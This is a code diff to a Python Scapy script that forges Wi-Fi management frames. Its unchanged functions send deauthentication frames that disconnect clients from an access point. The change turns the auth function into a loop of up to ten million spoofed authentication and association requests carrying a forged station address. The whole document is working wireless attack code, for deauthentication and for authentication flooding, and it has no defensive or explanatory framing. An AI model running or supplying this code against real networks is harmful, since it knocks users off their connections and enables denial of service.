@@ -1,5 +1,6 @@
-from scapy.all import Dot11,RadioTap,sendp,RandMAC,Dot11Deauth,Dot11Auth,Dot11AssoReq
+from scapy.all import Dot11,RadioTap,sendp,RandMAC,Dot11Deauth,Dot11Auth,Dot11AssoReq,Dot11Elt
 import argparse
+import time
 
 def deauth_broadcast(iface: str, ap: str):
   # AP broadcast
@@ -20,9 +21,13 @@ def deauth_station(iface: str, ap: str, station: str):
   sendp(frame, iface=iface, loop=10, inter=0.00100)
   
 def auth(iface: str, ap: str, station: str):
-  dot11 = Dot11(addr1=ap, addr2=station, addr3=ap)
-  frame = RadioTap()/dot11/Dot11Auth()/Dot11AssoReq(cap=0x1100, listen_interval=0x00a)
-  sendp(frame, iface=iface, loop=10, inter=0.00100)
+  for i in range(10000000):
+    dot11 = Dot11(addr1=ap, addr2=station, addr3=ap)
+    frame = RadioTap()/dot11/Dot11Auth(algo=0, seqnum=0x0001, status=0x0000)
+    sendp(frame, iface=iface, count=1,inter=0.00100)
+    frame = RadioTap()/dot11/Dot11AssoReq(cap=0x1100, listen_interval=0x00a)/Dot11Elt(ID=0, info="MY_BSSID")
+    time.sleep(1)
+    sendp(frame, iface=iface, count=1,inter=0.00100)
 
 if __name__ == "__main__":
   parser = argparse.ArgumentParser()    
